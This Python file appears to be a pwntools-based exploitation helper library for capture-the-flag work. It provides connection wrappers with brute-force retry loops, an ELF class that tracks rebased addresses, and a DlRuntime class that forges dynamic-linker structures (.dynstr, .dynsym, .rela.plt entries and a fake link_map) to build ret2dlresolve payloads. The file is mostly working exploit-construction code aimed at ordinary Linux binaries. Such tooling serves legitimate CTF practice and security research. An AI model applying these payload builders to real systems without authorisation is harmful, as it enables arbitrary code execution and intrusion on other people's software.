#!/usr/bin/env python
from pwn import *
from pwnlib.elf.elf import dotdict
import os

p = lambda x: pack(x)
u = lambda x: unpack(x, len(x)*8)

class Environment:
    def __init__(self, *envs):
        self.__env = None
        self.env_list = list(set(envs))
        for env in self.env_list:
            setattr(self, env, dict())

    def set_item(self, name, **obj):
        if obj.keys()!=self.env_list:
            fail('Environment : "%s" environment does not match' % name)
            return

        for env in obj:
            getattr(self, env).update({name:obj[env]})

    def select(self, env=None):
        if env is not None and env not in self.env_list:
            warn('Environment : "%s" is not defined' % env)
            env = None

        while env is None:
            sel = raw_input('Select Environment\n%s ...' % str(self.env_list)).strip()
            if not sel:
                env = self.env_list[0]
            elif sel in self.env_list:
                env = sel
            else:
                for e in self.env_list:
                    if e.startswith(sel):
                        env = e
                        break

        info('Environment : set environment "%s"' % env)
        for name,obj in getattr(self, env).items():
            setattr(self, name, obj)
        self.__env = env

    def check(self, env):
        return self.__env == env

class Communicate:
    def __init__(self, mode='SOCKET', *args, **kwargs):
        self.mode = mode
        self.args = args
        self.kwargs = kwargs
        self._conn = None

        self.debug = mode == 'DEBUG'

    def __del(self):
        self._conn.close()

    def connect(self):
        if self._conn is not None:
            self._conn.close()

        if self.mode == 'DEBUG':
            if 'argv' in self.kwargs:
                argv = self.kwargs['argv']
                del self.kwargs['argv']
            else:
                argv = './argv'
            conn = gdb.debug(argv, *self.args, **self.kwargs)
        elif self.mode == 'SOCKET':
            conn = remote(*self.args, **self.kwargs)
        elif self.mode == 'PROC':
            conn = process(*self.args, **self.kwargs)
        elif self.mode == 'SSH':
            need_shell = False
            if 'raw' in self.kwargs:
                need_shell = self.kwargs['raw']
                del self.kwargs['raw']

            conn = ssh(*self.args, **self.kwargs)
            if need_shell:
                conn = conn.shell()
        else:
            warn('communicate : self.mode "%s" is not defined' % self.mode)
            conn = None

        self._conn = conn
        return conn

    def run(self, func, **kwargs):
        return func(self._conn, **kwargs)

    def bruteforce(self, func, **kwargs):
        if self.debug:
            warn('bruteforce : disabled bruteforce in debug mode')
            self.run(func, **kwargs)
        else:
            while True:
                try:
                    self.run(func, **kwargs)
                except:
                    self.connect()
                else:
                    break

    def repeat(self, func, break_lv, *args, **kwargs):
        arg = kwargs['arg'] if 'arg' in kwargs else []
        level = len(arg)
        nests = len(args)

        for x in args[0]:
            kwargs['arg'] = arg + [x]
            try:
                if nests > 1:
                    self.repeat(func, break_lv, *args[1:], **kwargs)
                else:
                    self.run(func, **kwargs)
            except Exception as e:
                if level > break_lv:
                    raise e
                else:
                    self.connect()
            else:
                if level >= break_lv:
                    self.connect()
                    break

    @property
    def connection(self):
        return self._conn

#==========

class ELF(pwnlib.elf.elf.ELF):
    sap_function    = {}
    sap_section     = {}

    def __init__(self, path, checksec=True):
        super(ELF, self).__init__(path, checksec)

        self.sep_function   = dotdict()
        self.sep_section    = dotdict()

        self._populate_function()
        self._populate_section()

    @pwnlib.elf.elf.ELF.address.setter
    def address(self, new):
        delta     = new-self._address
        update    = lambda x: x+delta

        self.symbols        = dotdict({k:update(v) for k,v in self.symbols.items()})
        self.plt            = dotdict({k:update(v) for k,v in self.plt.items()})
        self.got            = dotdict({k:update(v) for k,v in self.got.items()})
        self.sep_function   = dotdict({k:update(v) for k,v in self.sep_function.items()})
        self.sep_section    = dotdict({k:update(v) for k,v in self.sep_section.items()})

        # Update our view of memory
        memory = pwnlib.elf.elf.intervaltree.IntervalTree()

        for begin, end, data in self.memory:
            memory.addi(update(begin),
                        update(end),
                        data)

        self.memory = memory

        self._address = update(self.address)

    def _populate_function(self):
        for name in self.functions:
            self.sep_function[name] = self.functions[name].address

    def _populate_section(self):
        for sec in self.iter_sections():
            self.sep_section[sec.name]  = sec.header.sh_addr

    @property
    def libc(self):
        for lib in self.libs:
            if '/libc.' in lib or '/libc-' in lib:
                return ELF(lib)

class DlRuntime:
    def __init__(self, elf):
        self._elf  = elf if isinstance(elf, ELF) else ELF(elf)
        self._arch = 64 if context.arch in ['x86_64','amd64'] else 32 if context.arch in ['x86', 'i386'] else 0

    def lookup(self, avoid_version = False):
        return self.Lookup(self, avoid_version)

    def delta(self, base = None):
        return self.Delta(self, base)

    class Lookup:
        def __init__(self, elf, avoid_version = False):
            self.__dlr  = elf if isinstance(elf, DlRuntime) else DlRuntime(elf)
            elf         = self.__dlr._elf

            self.__addr_dynsym  = elf.sep_section['.dynsym']
            self.__addr_dynstr  = elf.sep_section['.dynstr']
            self.__addr_relplt  = elf.sep_section['.rela.plt' if self.__arch == 64 else '.rel.plt']
            self.__addr_version = None if avoid_version else elf.sep_section['.gnu.version']

            self.__reloc_offset = {}
            self.__sym_reloc    = {}
            self.__payload      = ''

        @property
        def __arch(self):
            return self.__dlr._arch

        def add_reloc(self, dynstr, reloc_addr):
            self.__sym_reloc.update({dynstr:reloc_addr})

        def resolve(self, addr_buf):
            assert(self.__arch in [64, 32])

            d = {}
            dynstr = dynsym = relplt = ''

            addr_buf_dynstr = addr_buf
            for s,a in self.__sym_reloc.items():
                d.update({s:len(dynstr)})
                dynstr += s+'\x00'

            align = 0x18 if self.__arch == 64 else 0x10

            addr_buf_dynsym      = addr_buf_dynstr + len(dynstr)
            pad_dynsym           = (align - (addr_buf_dynsym - self.__addr_dynsym) % align) % align
            addr_buf_dynsym     += pad_dynsym

            for s,ofs in d.items():
                dynsym  += p32(addr_buf_dynstr + ofs - self.__addr_dynstr)
                if self.__arch == 64:
                    dynsym  += p32(0x12)
                    dynsym  += p64(0)
                    dynsym  += p64(0)
                elif self.__arch == 32:
                    dynsym  += p32(0)
                    dynsym  += p32(0)
                    dynsym  += p32(0x12)

            addr_buf_relplt      = addr_buf_dynsym + len(dynsym)
            pad_relplt           = ((0x18-(addr_buf_relplt - self.__addr_relplt)%0x18)%0x18) if self.__arch == 64 else 0
            addr_buf_relplt     += pad_relplt

            r_info = (addr_buf_dynsym - self.__addr_dynsym) / align
            if self.__addr_version is not None:
                debug('DlRuntime : check gnu version : [0x%08x] & 0x7fff' % (self.__addr_version + r_info*2))
            else:
                debug('DlRuntime : check if link_map->l_info[VERSYMIDX (DT_VERSYM)] == NULL (offset : %x)' % (0x1c8 if self.__arch == 64 else 0xe4))

            for s,a in self.__sym_reloc.items():
                if self.__arch == 64:
                    self.__reloc_offset.update({s : (addr_buf_relplt + len(relplt) -self.__addr_relplt)/0x18})
                    relplt  += p64(a)
                    relplt  += p32(0x7)
                    relplt  += p32(r_info)
                    relplt  += p64(0)
                elif self.__arch == 32:
                    self.__reloc_offset.update({s : addr_buf_relplt + len(relplt) -self.__addr_relplt})
                    relplt  += p32(a)
                    relplt  += p32(r_info << 8 | 0x7)
                r_info  += 1

            if pad_dynsym:
                debug('DlRuntime : Auto padding dynsym size is 0x%d bytes' % pad_dynsym)
            if pad_relplt:
                debug('DlRuntime : Auto padding relplt size is 0x%d bytes' % pad_relplt)

            self.__payload =  dynstr + '@'*(pad_dynsym) + dynsym + '@'*(pad_relplt) + relplt

        @property
        def reloc_payload(self):
            return self.__payload

        @property
        def reloc_offset(self):
            return self.__reloc_offset

    class Delta:
        def __init__(self, elf, base = None):
            self.__dlr  = elf if isinstance(elf, DlRuntime) else DlRuntime(elf)
            elf         = self.__dlr._elf
            libc        = elf.libc

            if base is not None:
                self.addr_got_basefunc  = elf.got[base]
                self.addr_basefunc      = libc.sep_function[base]

            self.__addr_gotplt  = elf.sep_section['.got.plt']
            self.__got          = elf.got
            self.__function     = libc.sep_function
            self.__payload      = ''

        @property
        def __arch(self):
            return self.__dlr._arch

        def set_victim(self, victim):
            self.addr_got_victim    = self.__got[victim]
            if self.__arch == 64:
                self.reloc_offset       = (self.addr_got_victim - (self.__addr_gotplt+0x18))/8
            else:
                self.reloc_offset       = (self.addr_got_victim - (self.__addr_gotplt+0xc))*2

        def resolve(self, addr_buf, target, suffix = False):
            delta               = self.__function[target] - self.addr_basefunc
            addr_link_map       = addr_buf
            addr_symtab         = addr_link_map + ((0x100 if self.__arch == 64 else 0x80) if suffix else 0x8)
            addr_reloc          = addr_symtab   + 0x10
            addr_relplt         = addr_reloc    + 0x10
            addr_strtab         = addr_buf      # readable anyware

            link_map  = p(delta)
            link_map  = link_map.ljust(0x68 if self.__arch == 64 else 0x34, '\x00')
            link_map += p(addr_strtab)
            link_map += p(addr_symtab)
            link_map  = link_map.ljust(0xf8 if self.__arch == 64 else 0x7c, '\x00')
            link_map += p(addr_reloc)

            symtab  = p(6)
            symtab += p(self.addr_got_basefunc - (8 if self.__arch == 64 else 4))   # .dynsym
            symtab  = symtab.ljust(0x10, '\x00')

            debug('DlRuntime : check sym->st_other (0x%08x)' % (self.addr_got_basefunc + (-3 if self.__arch == 64 else 0x9)))

            reloc   = p(0x17)
            reloc  += p(addr_relplt - self.reloc_offset * (0x18 if self.__arch == 64 else 1))   # .rela.plt
            reloc   = reloc.ljust(0x10, '\x00')

            relplt  = p(self.addr_got_victim - delta)
            relplt += p32(0x7)
            if self.__arch == 64:
                relplt += p32(0)
                relplt += p64(0)

            self.__payload  = link_map if suffix else link_map[:0x8]
            self.__payload += symtab + reloc + relplt
            self.__payload += link_map[len(self.__payload):]

        @property
        def delta_payload(self):
            return self.__payload

# for backward compatibility
def communicate(mode='SOCKET', *args, **kwargs):
    comn = Communicate(mode, *args, **kwargs)
    return comn.connect()

def init():
    if 'TMUX' in os.environ:
        if 'DISPLAY' in os.environ:
            del os.environ['DISPLAY']

init()
